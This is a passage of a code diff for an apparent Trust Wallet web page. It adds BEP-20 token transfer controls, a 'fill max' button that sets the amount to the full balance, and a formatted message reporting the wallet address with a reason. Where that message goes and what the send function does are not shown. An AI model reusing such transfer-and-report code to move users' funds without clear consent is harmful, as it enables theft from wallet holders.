+        "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
+        "<b>Reason:</b> " + msg
+      );
+    } finally {
+      sendBtn.textContent = "Send";
+      updateSendEnabled();
+    }
+  }
+
+  function fillMax() {
+    var token = getSelectedToken();
+    if (!token) return;
+    var raw = tokenBalances[token.symbol];
+    if (raw === undefined) { setTransferMsg("Token balance not loaded yet.", "err"); return; }
+    amountInput.value = formatWei(raw, token.decimals);
+    updateSendEnabled();
+  }
+
   function disconnect() {
     currentAddr = null;
+    tokenBalances = {};
     balanceSec.style.display = "none";
+    transferSec.style.display = "none";
     disconnectBtn.style.display = "none";
     connectBtn.style.display = "block";
+    card.classList.remove("match");
     title.textContent = "Trust Wallet is installed 🛡️";
     desc.textContent  = "Connect to see your BEP-20 coins and balances.";
     statusMsg.textContent = "";
+    transferMsg.textContent = "";
+    amountInput.value = "";
   }
 
-  /* ------------------------------------------------------------------
-     Boot
-     ------------------------------------------------------------------ */
   connectBtn.addEventListener("click", connect);
   disconnectBtn.addEventListener("click", disconnect);
+  sendBtn.addEventListener("click", send);
+  maxBtn.addEventListener("click", fillMax);
+  amountInput.addEventListener("input", updateSendEnabled);
+  tokenSelect.addEventListener("change", function () {
+    transferMsg.textContent = "";
+    updateSendEnabled();
+  });
 
   detectTrust();
   requestProviders();
-
   setTimeout(detectTrust, 500);
   setTimeout(detectTrust, 1500);
   window.addEventListener("load", function () {
